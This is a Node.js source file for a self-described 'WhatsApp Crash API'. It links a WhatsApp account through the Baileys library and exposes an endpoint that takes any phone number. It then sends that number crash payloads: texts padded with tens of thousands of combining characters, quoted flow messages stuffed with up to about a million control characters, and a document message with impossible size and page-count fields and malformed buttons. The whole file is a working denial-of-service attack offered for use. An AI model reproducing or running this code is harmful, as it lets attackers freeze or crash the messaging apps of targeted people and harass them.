const {
    makeWASocket,
    makeInMemoryStore,
    fetchLatestBaileysVersion,
    useMultiFileAuthState,
    DisconnectReason,
    generateWAMessageFromContent,
    proto,
    WAMessageStatus,
} = require("@whiskeysockets/baileys");
const pino = require('pino');
const chalk = require('chalk');
const express = require('express');
const app = express();
const port = process.env.PORT || 3000;
const rateLimit = require('express-rate-limit');
let kuzuroken = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let userSessions = {};
const usePairingCode = true;
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
const createLimiter = (minutes, max) => rateLimit({
    windowMs: minutes * 60 * 1000,
    max: max
});
const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});
const startSesi = async () => {
    const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'おさらぎです',
        }),
    };

    kuzuroken = makeWASocket(connectionOptions);
    if (usePairingCode && !kuzuroken.authState.creds.registered) {
        let phoneNumber = await question(chalk.black(chalk.bgCyan(`\nMasukkan nomor diawali dengan 62:\n`)));
        phoneNumber = phoneNumber.replace(/[^0-9]/g, '');
        const code = await kuzuroken.requestPairingCode(phoneNumber.trim());
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;
        console.log(chalk.black(chalk.bgCyan(`Pairing Code: `)), chalk.black(chalk.bgWhite(formattedCode)));
    }

    kuzuroken.ev.on('creds.update', saveCreds);
    store.bind(kuzuroken.ev);

    kuzuroken.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === 'open') {
            isWhatsAppConnected = true;
            console.log(chalk.green('WhatsApp berhasil terhubung!'));
        }

        if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus.'),
                shouldReconnect ? 'Mencoba untuk menghubungkan ulang...' : 'Silakan login ulang.'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

const Qrad = {
    key: {
        remoteJid: 'p',
        from: false,
        participant: '0@s.whatsapp.net'
    },
    message: {
        "interactiveResponseMessage": {
            "body": {
                "text": "Sent",
                "format": "DEFAULT"
            },
            "nativeFlowResponseMessage": {
                "name": "galaxy_message",
                "paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"🦄드림 가이 Xeon\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"🦄드림 가이 Xeon\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"🦄드림 가이 Xeon${"\u0003".repeat(1045000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                "version": 3
            }
        }
    }
}
const XeonRep = {
    key: {
        remoteJid: 'p',
        fromMe: false,
        participant: '0@s.whatsapp.net'
    },
    message: {
        "interactiveResponseMessage": {
            "body": {
                "text": "Sent",
                "format": "DEFAULT"
            },
            "nativeFlowResponseMessage": {
                "name": "galaxy_message",
                "paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"🦄드림 가이 Xeon\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"🦄드림 가이 Xeon\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"🦄드림 가이 Xeon${"\u0003".repeat(350000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                "version": 3
            }
        }
    }
}
const XeonRep2 = {
    key: {
        remoteJid: 'p',
        fromMe: false,
        participant: '0@s.whatsapp.net'
    },
    message: {
        "interactiveResponseMessage": {
            "body": {
                "text": "Sent",
                "format": "DEFAULT"
            },
            "nativeFlowResponseMessage": {
                "name": "galaxy_message",
                "paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"🦄드림 가이 Xeon\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"🦄드림 가이 Xeon\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"🦄드림 가이 Xeon${"\u0003".repeat(1020000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                "version": 3
            }
        }
    }
}
const XeonRep3 = {
    key: {
        remoteJid: 'p',
        fromMe: false,
        participant: '0@s.whatsapp.net'
    },
    message: {
        "interactiveResponseMessage": {
            "body": {
                "text": "Sent",
                "format": "DEFAULT"
            },
            "nativeFlowResponseMessage": {
                "name": "galaxy_message",
                "paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"🦄드림 가이 Xeon\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"🦄드림 가이 Xeon\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"🦄드림 가이 Xeon${"\u0003".repeat(777777)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                "version": 3
            }
        }
    }
}


app.use(express.json());

app.get('/', (req, res) => {
    res.json({
        status: true,
        creator: 'Bakuzaan',
        message: 'WhatsApp Crash API is running',
        endpoints: [
            {
                path: '/api/xeonuinew',
                method: 'GET',
                params: {
                    number: 'string (format: 62xxx)',
                    apikey: 'string'
                },
                example: '/api/xeonuinew?number=628123456789&apikey=bakuzaan'
            }
        ]
    });
});

const validateRequest = async (req, res, next) => {
    const { number, apikey } = req.query;
    
    if (!number || !apikey) {
        return res.status(400).json({
            status: false,
            message: 'Nomor dan ApiKey diperlukan'
        });
    }

    if (apikey !== 'bakuzaan') {
        return res.status(401).json({
            status: false,
            message: 'API key tidak valid'
        });
    }

    if (!kuzuroken || !isWhatsAppConnected) {
        return res.status(503).json({
            status: false,
            message: 'WhatsApp belum terhubung, silakan tunggu'
        });
    }

    req.target = `${number}@s.whatsapp.net`;
    next();
};

app.use('/api/*', validateRequest);

app.get('/api/xeonuinew', createLimiter(15, 5), validateRequest, async (req, res) => {
    try {
        const target = req.target;
        
        try {
            let message1 = await kuzuroken.sendMessage(target, {
                text: "🦄드림 가이 Xeon" + "ꦾ".repeat(50000)
            });
            
            let message2 = await kuzuroken.sendMessage(target, {
                text: "🦄드림 가이 Xeon" + "᭫".repeat(20000)
            }, { quoted: XeonRep });

            let etc = generateWAMessageFromContent(target,
                proto.Message.fromObject({
                    viewOnceMessage: {
                        message: {
                            interactiveMessage: {
                                header: {
                                    title: "",
                                    documentMessage: {
                                        url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                        fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                                        fileLength: "9999999999999",
                                        pageCount: 9007199254740991,
                                        mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
                                        fileName: "🦄드림 가이 Xeon",
                                        fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
                                        directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                                        mediaKeyTimestamp: "1723855952",
                                        contactVcard: true,
                                        jpegThumbnail: req.query.thumbnail || null
                                    },
                                    hasMediaAttachment: true
                                },
                                body: {
                                    text: "🦄드림 가이 Xeon" + "ꦾ".repeat(50000)
                                },
                                nativeFlowMessage: {
                                    messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" 🦄드림 가이 Xeon \",\"body\":\"xxx\"}",
                                    buttons: [
                                        {
                                            name: "payment_method",
                                            buttonParamsJson: ""
                                        },
                                        {
                                            name: "call_permission_request",
                                            buttonParamsJson: "{}"
                                        },
                                        {
                                            name: "payment_method",
                                            buttonParamsJson: "{}"
                                        },
                                        {
                                            name: "single_select",
                                            buttonParamsJson: "{\"title\":\"🦄드림 가이 Xeon\",\"sections\":[{\"title\":\"🦄드림 가이 Xeon\",\"rows\":[]}]}"
                                        },
                                        {
                                            name: "galaxy_message",
                                            buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"🦄드림 가이 Xeon\",\"flow_id\":\"🦄드림 가이 Xeon\",\"flow_message_version\":\"9\",\"flow_token\":\"🦄드림 가이 Xeon\"}"
                                        },
                                        {
                                            name: "mpm",
                                            buttonParamsJson: "{}"
                                        }
                                    ]
                                }
                            }
                        }
                    }
                }), {
                    userJid: target,
                    quoted: XeonRep
                }
            );
            
            await kuzuroken.relayMessage(target, etc.message, {});
            await new Promise(resolve => setTimeout(resolve, 1000));

            console.log(`Pesan terkirim ke ${target}`);

            res.json({
                status: true,
                message: 'Pesan berhasil dikirim',
                data: {
                    target: target,
                    details: {
                        message1: message1?.key || null,
                        message2: message2?.key || null,
                        message3: 'crash message sent'
                    }
                }
            });

        } catch (sendError) {
            console.error('Error saat mengirim pesan:', sendError);
            
            if (sendError.message.includes('Connection Closed')) {
                await startSesi();
                return res.status(503).json({
                    status: false,
                    message: 'Koneksi terputus, silakan coba lagi',
                    error: sendError.message
                });
            }
            
            throw sendError;
        }

    } catch (error) {
        console.error('Error umum:', error);
        res.status(500).json({
            status: false,
            message: 'Internal server error',
            error: error.message
        });
    }
});

const findAvailablePort = (startPort) => {
    return new Promise((resolve, reject) => {
        const server = net.createServer();
        server.unref();
        server.on('error', (err) => {
            if (err.code === 'EADDRINUSE') {
                findAvailablePort(startPort + 1).then(resolve);
            } else {
                reject(err);
            }
        });
        server.listen(startPort, () => {
            server.close(() => {
                resolve(startPort);
            });
        });
    });
};

const startServer = () => {
    const port = 3000;
    app.listen(port, '0.0.0.0', () => {
        console.log(`Server berjalan di port ${port}`);
        startSesi();
    }).on('error', (err) => {
        console.error('Error starting server:', err);
    });
};

startServer();

